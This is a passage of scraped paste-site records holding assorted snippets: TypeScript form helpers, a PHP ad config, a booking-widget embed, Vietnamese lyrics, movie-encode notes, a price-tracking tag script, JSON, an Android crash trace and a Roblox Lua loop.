T,\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.patchValue(value, options));\n\xa0 }\n\xa0\n\xa0 /**\n\xa0 \xa0* Disables each control in the array\n\xa0 \xa0*/\n\xa0 static disableControls(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.disable(options));\n\xa0 }\n\xa0\n\xa0 /**\n\xa0 \xa0* Enables each control in the array\n\xa0 \xa0*/\n\xa0 static enableControls(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.enable(options));\n\xa0 }\n\xa0\n}", date='2022-06-01 11:50:09 +00:00', hash_val='1fc86e7636f3af26ed088c3b259c684f', url='/me0WmRP2', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='szotyi41', title='Untitled', content="<?php\n\xa0\n$example = [\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Személyi kölcsön',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_2' => [\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'headline_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Vedd fel álmaid kölcsönét!',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Készpénzben!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'cta_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Kalkulálj!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_name_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodName'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodImage'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 ]", date='2022-06-01 11:47:25 +00:00', hash_val='9e6144ecb91d47ec7988247132573c8c', url='/cGVcumWu', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='borlabs', title='SimplybookWidget', content='[borlabs-cookie id=""simplybook"" type=""content-blocker""]<script src=""https://widget.simplybook.it/v2/widget/widget.js""></script><script>\nwindow.BorlabsCookie.callWhenLoaded(""SimplybookWidget"", function () {\n\xa0 \xa0 var widget = new SimplybookWidget({""widget_type"":""iframe"",""url"":""https:\\/\\/faszienbodensee.simplybook.it"",""theme"":""minimal"",""theme_settings"":{""timeline_show_end_time"":""1"",""timeline_modern_display"":""as_slots"",""hide_company_label"":""1"",""timeline_hide_unavailable"":""1"",""hide_past_days"":""1"",""sb_base_color"":""#97c9c1"",""btn_color_1"":""#97c9c1,#97c9c1,#97c9c1"",""link_color"":""#392f5a"",""display_item_mode"":""block"",""body_bg_color"":""#FEF9EC"",""sb_review_image"":"""",""dark_font_color"":""#595959"",""light_font_color"":""#ffffff"",""sb_company_label_color"":""#392f5a"",""hide_img_mode"":""1"",""sb_busy"":""#aaa6aa"",""sb_available"":""#2b212b""},""timeline"":""modern"",""datepicker"":""top_calendar"",""is_rtl"":false,""app_config"":{""allow_switch_to_ada"":0,""predefined"":[]}});\n});\n</script>[/borlabs-cookie]', date='2022-06-01 11:29:11 +00:00', hash_val='f36d24fffe9fce5a45ef6a87f5bd1865', url='/Eb9uukQC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='datafile', title='Matchanah 2  Matchanah 2 - Híu, Bâu  | HoatHinh.tv | J0ee4ofk5pDi', content='Lời bài hát Matchanah 2 \xa0Matchanah 2 - Híu, Bâu \xa0| HoatHinh.tv | J0ee4ofk5pDi Lyrics up by vnflix.com Không thích cảm giác phải nhớ mong \nRồi lại yêu thêm một ai\nNhưng mà vì em mà con tim anh lại thêm một nhịp sai\ncảm giác nhớ mong \nchiều nhẹ nhàng \nBuông xuống đôi hàng mi \nlà vì em đó \nmà lòng vội vàng \nThôi nói ra làm chi\nlà vì em đó \nBaby tell me what your name \nVội vàng xin số \nXin thêm cuộc hẹn \nNgay trong đêm\nSay la la la la \nLa la la la\nBao câu ca\ntặng em cùng đoá hoa\n\xa0\nvì em là matcha machiato \nMang yêu thương này đi vội \nem là matcha machiato \nThương sao chẳng nói nên lời\n\xa0\nlà matcha machiato \nĐem câu ca này buông lời \nAh ha ha ha \n\xa0\nvừa đắm vừa say \nEm làm con tim bối rối ở đây \nlời nói vừa trao \nEm mà đồng ý thì hay qá rồi sao \nnếu như mình có \nvài tình ý \nthì cứ nói cùng nhau \n\xa0\nĐừng chỉ ghé đưa nhẹ ánh mắt \nMà hãy kèm theo nó là một lời chào\n\xa0\nGiờ anh lại thích \nphải ngóng trông \nRồi lại rơi vào tình yêu \nChẳng cần biết là bao lâu \nHay là\nNơi nào mình yêu \n\xa0\ncảm giác nhớ mong \nchiều nhẹ nhàng \nBuông xuống đôi hàng mi \nlà vì em đó \nmà lòng vội vàng \nThôi nói ra làm chi\n\xa0\nlà vì em đó \nBaby tell me what your name \nVội vàng xin số \nXin thêm cuộc hẹn \nNgay trong đêm\nSay la la la la \nLa la la la\nBao câu ca\ntặng em cùng đoá hoa\n\xa0\nvì em là matcha machiato \nMang yêu thương này đi vội \nlà matcha machiato \nThương sao chẳng nói nên lời\n\xa0\nlà matcha machiato \nĐem câu ca này buông lời \nAh ha ha ha', date='2022-06-01 11:00:40 +00:00', hash_val='9a5b551d9d04c21de2b9f2bb3bff79e9', url='/1c8LP5ed', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='trds', title='Untitled', content="[size=3][b]The Northman [/b][/size]\n\xa0\n[size=2][b][u]Technical information[/u][/b][/size]\n[font=Courier New]RUNTIME.......:[/font] 2 h 16 min\n[font=Courier New]SIZE..........:[/font] 17.8 GiB\n[font=Courier New]VIDEO CODEC...:[/font] x264, CRF, L4.1\n[font=Courier New]FRAMERATE.....:[/font] 23.976\n[font=Courier New]BITRATE.......:[/font] 16.9 Mb/s\n[font=Courier New]RESOLUTION....:[/font] 1920x960 pixels\n[font=Courier New]AUDIO1........:[/font] English DD+7.1 at 1 536 kb/s \xa0\n[font=Courier New]AUDIO2........:[/font] English DD2.0 at 192 kb/s - Commentary by director/co-writer Robert Eggers \n[font=Courier New]SUBTITLES.....:[/font] English Forced, English, English SDH, Romanian, French, Spanish\n[font=Courier New]CHAPTERS......:[/font] Yes\n[font=Courier New]SOURCE1.......:[/font] The Northman 2022 1080p Blu-ray AVC TrueHD 7.1-MTeam \n[font=Courier New]SOURCE2.......:[/font] The Northman 2022 REPACK 2160p WEB-DL DD+5.1 HEVC-MZABI\n[font=Courier New]ENCODER.......:[/font] Cristi\n[font=Courier New]NOTES.........:[/font] Blu-ray disc a lil' bit superior to WEB-DL 2160p SDR.\nUsed the WEB-DL just to replace hardcoded subs from disc (check #5 set of comparisons).\nReplaceFramesSimple & z_ConvertFormat were used.\n\xa0\n[quote]x264 [info]: frame I:957 \xa0 Avg QP:12.22 \xa0size:125053\nx264 [info]: frame P:39464 Avg QP:14.12 \xa0size: 66372\nx264 [info]: frame B:156507 Avg QP:15.51 \xa0size: 37690\nx264 [info]: consecutive B-frames: \xa01.0% \xa01.9% \xa06.8% 15.4% 15.3% 45.7% \xa06.3% \xa02.9% \xa02.6% \xa02.1%[/quote]\n[center] \n\xa0\n[size=2][b]Source|luvBB|WEB-DL|MTeam[/b][/size]\n[url=https://img.hdbits.org/UHHxNjp][img]https://t.hdbits.org/UHHxNjp.jpg[/img][/url] [url=https://img.hdbits.org/LVFUVMU][img]https://t.hdbits.org/LVFUVMU.jpg[/img][/url] [url=https://img.hdbits.org/96BBVLC][img]https://t.hdbits.org/96BBVLC.jpg[/img][/url] [url=https://img.hdbits.org/seOdtbK][img]https://t.hdbits.org/seOdtbK.jpg[/img][/url] \n[url=https://img.hdbits.org/HOiZeQi][img]https://t.hdbits.org/HOiZeQi.jpg[/img][/url] [url=https://img.hdbits.org/EC2QijE][img]https://t.hdbits.org/EC2QijE.jpg[/img][/url] [url=https://img.hdbits.org/WUCV0K2][img]https://t.hdbits.org/WUCV0K2.jpg[/img][/url] [url=https://img.hdbits.org/NJq7PG8][img]https://t.hdbits.org/NJq7PG8.jpg[/img][/url] \n[url=https://img.hdbits.org/FxHCWCt][img]https://t.hdbits.org/FxHCWCt.jpg[/img][/url] [url=https://img.hdbits.org/uYkxG8Y][img]https://t.hdbits.org/uYkxG8Y.jpg[/img][/url] [url=https://img.hdbits.org/u7oruTm][img]https://t.hdbits.org/u7oruTm.jpg[/img][/url] [url=https://img.hdbits.org/FmhiiI3][img]https://t.hdbits.org/FmhiiI3.jpg[/img][/url] \n[url=https://img.hdbits.org/r5SypKm][img]https://t.hdbits.org/r5SypKm.jpg[/img][/url] [url=https://img.hdbits.org/0a9i7jA][img]https://t.hdbits.org/0a9i7jA.jpg[/img][/url] [url=https://img.hdbits.org/QUrKSzU][img]https://t.hdbits.org/QUrKSzU.jpg[/img][/url] [url=https://img.hdbits.org/tmcL4HF][img]https://t.hdbits.org/tmcL4HF.jpg[/img][/url] \n[url=https://img.hdbits.org/f4PpeiV][img]https://t.hdbits.org/f4PpeiV.jpg[/img][/url] [url=https://img.hdbits.org/bbmvF3A][img]https://t.hdbits.org/bbmvF3A.jpg[/img][/url] [url=https://img.hdbits.org/2Q2l3kO][img]https://t.hdbits.org/2Q2l3kO.jpg[/img][/url] [url=https://img.hdbits.org/VQn8jFw][img]https://t.hdbits.org/VQn8jFw.jpg[/img][/url] \n[url=https://img.hdbits.org/FbmuxhR][img]https://t.hdbits.org/FbmuxhR.jpg[/img][/url] [url=https://img.hdbits.org/SNx5tcu][img]https://t.hdbits.org/SNx5tcu.jpg[/img][/url] [url=https://img.hdbits.org/X9GsMW3][img]https://t.hdbits.org/X9GsMW3.jpg[/img][/url] [url=https://img.hdbits.org/aCK1AZo][img]https://t.hdbits.org/aCK1AZo.jpg[/img][/url][/center]", date='2022-06-01 10:56:06 +00:00', hash_val='b19171be9f47eb161a06b028120ca80e', url='/265imbAB', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='NikolayBezay', title='Carpetshop embed for GTM Total page price.', content="<script>\n(function() {\n\xa0 \xa0 function setTotalPrice() {\n\xa0 \xa0 \xa0 \xa0 var cartPrice, cartPriceContainer = document.querySelector('div[data-subtotal].ajaxcart__subtotal');\n\xa0 \xa0 \xa0 \xa0 if (cartPriceContainer) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 cartPrice = cartPriceContainer.textContent.replace('₪','').replace(',','').trim();\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 var checkoutPrice, checkoutPriceContainer = document.querySelector('.payment-due__price');\n\xa0 \xa0 \xa0 \xa0 if (checkoutPriceContainer) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 checkoutPrice = checkoutPriceContainer.textContent.replace('₪','').replace(',','').trim();\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 if (cartPrice || checkoutPrice) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 var totalPagePrice = cartPrice ? parseInt(cartPrice) : parseInt(checkoutPrice);\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 window.sessionStorage.setItem('adoricTotalPagePrice', totalPagePrice);\n\xa0 \xa0 \xa0 \xa0 } else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 window.sessionStorage.setItem('adoricTotalPagePrice', 0);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 let PAGE_BODY = document.querySelector('BODY');\n\xa0 \xa0 PAGE_BODY.addEventListener('click', setTotalPrice);\n\xa0 \xa0 PAGE_BODY.addEventListener('touchend', setTotalPrice);\n\xa0 \xa0 if (document.readyState === 'loading') {\n\xa0 \xa0 \xa0 \xa0 document.addEventListener('DOMContentLoaded', setTotalPrice);\n\xa0 \xa0 } else {\n\xa0 \xa0 \xa0 \xa0 setTotalPrice();\n\xa0 \xa0 }\n})();\n</script>", date='2022-06-01 10:53:03 +00:00', hash_val='e4ef8d93da57f0136b632fcdfcaa2b2c', url='/HmxfrnRy', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='DavudHaji', title='Json for AutoProfile (Example)', content='{\n\xa0 \xa0 ""id"": 1,\n\xa0 \xa0 ""enable"": true,\n\xa0 \xa0 ""branch_id"": 1,\n\xa0 \xa0 ""unversal_profile_id"": null,\n\xa0 \xa0 ""template_id"": 1,\n\xa0 \xa0 ""service_groups"": [\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""percent"": 40,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""group_id"": 1\n\xa0 \xa0 \xa0 \xa0 },\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"":2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""percent"": 60,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""group_id"": 2\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 ],\n\xa0 \xa0 ""allowed_profiles"":[\n\xa0 \xa0 \xa0 \xa0 1,\n\xa0 \xa0 \xa0 \xa0 2,\n\xa0 \xa0 \xa0 \xa0 3,\n\xa0 \xa0 \xa0 \xa0 5\n\xa0 \xa0 ],\n\xa0 \xa0 ""queue_profile"": [\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"": 1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""profile_id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""queue_id"": 6\n\xa0 \xa0 \xa0 \xa0 },\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0""profile_id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0""queue_id"":5\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 ]\n}', date='2022-06-01 10:38:38 +00:00', hash_val='da7784ff281373d2619ac3c3ad0a8b56', url='/CtwGnkGJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='devil2010', title='Link crash', content='Build version: 1.8.6 \nBuild date: 1981-01-01 01:01:02 \nCurrent date: 2022-06-01 16:48:35 \nDevice: Samsung SM-G570Y \nOS version: Android 8.0.0 (SDK 26) \n\xa0\nStack trace: \xa0\njava.lang.RuntimeException: Unable to start activity ComponentInfo{com.civix.link/com.civix.link.Screen.NotificationClickScreen}: java.lang.IllegalStateException: Only fullscreen activities can request orientation\n\xa0 \xa0 at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2957)\n\xa0 \xa0 at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3032)\n\xa0 \xa0 at android.app.ActivityThread.-wrap11(Unknown Source:0)\n\xa0 \xa0 at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1696)\n\xa0 \xa0 at android.os.Handler.dispatchMessage(Handler.java:105)\n\xa0 \xa0 at android.os.Looper.loop(Looper.java:164)\n\xa0 \xa0 at android.app.ActivityThread.main(ActivityThread.java:6942)\n\xa0 \xa0 at java.lang.reflect.Method.invoke(Native Method)\n\xa0 \xa0 at com.android.internal.os.Zygote$MethodAndArgsCaller.run(Zygote.java:327)\n\xa0 \xa0 at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1374)\nCaused by: java.lang.IllegalStateException: Only fullscreen activities can request orientation\n\xa0 \xa0 at android.os.Parcel.readException(Parcel.java:1975)\n\xa0 \xa0 at android.os.Parcel.readException(Parcel.java:1913)\n\xa0 \xa0 at android.app.IActivityManager$Stub$Proxy.setRequestedOrientation(IActivityManager.java:6224)\n\xa0 \xa0 at android.app.Activity.setRequestedOrientation(Activity.java:5840)\n\xa0 \xa0 at com.civix.link.Screen.NotificationClickScreen.onCreate(NotificationClickScreen.kt:30)\n\xa0 \xa0 at android.app.Activity.performCreate(Activity.java:7183)\n\xa0 \xa0 at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1221)\n\xa0 \xa0 at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2910)\n\xa0 \xa0 ... 9 more\n\xa0\nUser actions: \n2022-06-01 16:48:34: NotificationClickScreen created', date='2022-06-01 09:49:14 +00:00', hash_val='4bf4318a34bb14a9e37ed82cf1eb8e24', url='/RcUN0MQm', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='gogowgogo', title='Announcement Client Manager', content='local Frame = script.Parent.Frame\nlocal TextLabel = Frame.TextLabel\n\xa0\nwhile true do\nTextLabel.Text = ""Please Subscribe!""\nwait(10)\n\xa0 \xa0 TextLabel.Text = ""Please Like!""\n\xa0 \xa0 wait(10)\n\xa0 \xa0 end', date='2022-06-01 09:33:52 +00:00', hash_val='eebc145dac3fe06661b80d1669b1f2df', url='/Ne4dJZVF', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 